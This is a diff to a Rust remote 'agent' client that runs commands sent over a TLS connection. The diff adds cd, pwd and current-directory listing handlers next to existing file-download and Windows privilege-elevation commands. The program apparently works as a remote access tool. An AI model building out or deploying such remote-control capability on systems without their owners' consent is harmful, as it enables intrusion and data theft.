@@ -31,12 +31,31 @@ use std::process::Command;
 use std::thread;
 use std::time::Duration;
 use std::fs;
-use std::path::Path;
-use std::sync::Arc;
+use std::path::{Path, PathBuf};
+use std::sync::{Arc, Mutex};
+use std::env;
 
 use rustls::ClientConfig;
 
 const DELIMITER: &str = "\n<<END>>\n";
+
+// Global current working directory for the agent
+lazy_static::lazy_static! {
+    static ref CURRENT_DIR: Mutex<PathBuf> = {
+        // Initialize with the current working directory or a default
+        let initial_dir = env::current_dir().unwrap_or_else(|_| {
+            #[cfg(target_os = "windows")]
+            {
+                PathBuf::from("C:\\")
+            }
+            #[cfg(not(target_os = "windows"))]
+            {
+                PathBuf::from("/")
+            }
+        });
+        Mutex::new(initial_dir)
+    };
+}
 
 /// Máximo de timeouts consecutivos antes de forzar reconexión.
 /// Sirve para detectar conexiones muertas cuando el servidor se cierra.
@@ -352,6 +371,18 @@ fn process_command(command: &str) -> String {
         let path = command.strip_prefix("__LISTDIR__:").unwrap_or("");
         debug_print!("DEBUG: Listando directorio: {}", path);
         list_directory(path)
+    } else if command == "__LISTDIR__" {
+        // List current directory if no path specified
+        debug_print!("DEBUG: Listando directorio actual");
+        let current = get_current_dir();
+        list_directory(&current)
+    } else if command.starts_with("__CD__:") {
+        let path = command.strip_prefix("__CD__:").unwrap_or("");
+        debug_print!("DEBUG: Cambiando directorio a: {}", path);
+        change_directory(path)
+    } else if command == "__PWD__" {
+        debug_print!("DEBUG: Obteniendo directorio actual");
+        get_pwd()
     } else if command.starts_with("__DOWNLOAD__:") {
         let path = command.strip_prefix("__DOWNLOAD__:").unwrap_or("");
         debug_print!("DEBUG: Descargando archivo: {}", path);
@@ -1123,12 +1154,88 @@ fn elevate_command(command: &str) -> String {
     format!("__ERROR__:Elevación solo soportada en Windows{}", DELIMITER)
 }
 
-fn list_directory(dir_path: &str) -> String {
-    debug_print!("DEBUG: Listando directorio: {}", dir_path);
+/// Get the current working directory as a string
+fn get_current_dir() -> String {
+    CURRENT_DIR.lock()
+        .map(|dir| dir.to_string_lossy().to_string())
+        .unwrap_or_else(|_| {
+            #[cfg(target_os = "windows")]
+            { "C:\\".to_string() }
+            #[cfg(not(target_os = "windows"))]
+            { "/".to_string() }
+        })
+}
+
+/// Change the current working directory
+fn change_directory(path: &str) -> String {
+    let new_path = if path.is_empty() {
+        // Empty path means go to home or default
+        #[cfg(target_os = "windows")]
+        {
+            env::var("USERPROFILE").unwrap_or_else(|_| "C:\\".to_string())
+        }
+        #[cfg(not(target_os = "windows"))]
+        {
+            env::var("HOME").unwrap_or_else(|_| "/".to_string())
+        }
+    } else if path == ".." {
+        // Go up one directory
+        let current = get_current_dir();
+        Path::new(&current)
+            .parent()
+            .map(|p| p.to_string_lossy().to_string())
+            .unwrap_or(current)
+    } else if path.starts_with('/') || (path.len() >= 2 && path.chars().nth(1) == Some(':')) {
+        // Absolute path
+        path.to_string()
+    } else {
+        // Relative path
+        let current = get_current_dir();
+        let current_path = Path::new(&current);
+        current_path.join(path).to_string_lossy().to_string()
+    };
     
-    match fs::read_dir(dir_path) {
+    // Verify the path exists and is a directory
+    let path_obj = Path::new(&new_path);
+    if path_obj.exists() && path_obj.is_dir() {
+        match CURRENT_DIR.lock() {
+            Ok(mut dir) => {
+                *dir = PathBuf::from(&new_path);
+                debug_print!("DEBUG: Directorio cambiado a: {}", new_path);
+                format!("__CWD__:{}{}", new_path, DELIMITER)
+            }
+            Err(e) => {
+                format!("__ERROR__:Error interno al cambiar directorio: {}{}", e, DELIMITER)
+            }
+        }
+    } else if !path_obj.exists() {
+        format!("__ERROR__:El directorio no existe: {}{}", new_path, DELIMITER)
+    } else {
+        format!("__ERROR__:La ruta no es un directorio: {}{}", new_path, DELIMITER)
+    }
+}
+
+/// Get current working directory response
+fn get_pwd() -> String {
+    let current = get_current_dir();
+    format!("__CWD__:{}{}", current, DELIMITER)
+}
+
+fn list_directory(dir_path: &str) -> String {
+    // Use the provided path, or current directory if empty
+    let actual_path = if dir_path.is_empty() {
+        get_current_dir()
+    } else {
+        dir_path.to_string()
+    };
+    
+    debug_print!("DEBUG: Listando directorio: {}", actual_path);
+    
+    match fs::read_dir(&actual_path) {
         Ok(entries) => {
-            let mut result = String::from("__DIRLIST__:");
+            // Format: __DIRLIST__:path:entries
+            // This includes the path so the client knows which directory was listed
+            let mut result = format!("__DIRLIST__:{}:", actual_path);
             let mut items = Vec::new();
             
             for entry in entries {
@@ -1159,7 +1266,7 @@ fn list_directory(dir_path: &str) -> String {
         }
         Err(e) => {
             debug_print!("DEBUG: Error listando directorio: {}", e);
-            format!("__ERROR__:No se pudo listar el directorio: {}{}", e, DELIMITER)
+            format!("__ERROR__:No se pudo listar el directorio '{}': {}{}", actual_path, e, DELIMITER)
         }
     }
 }
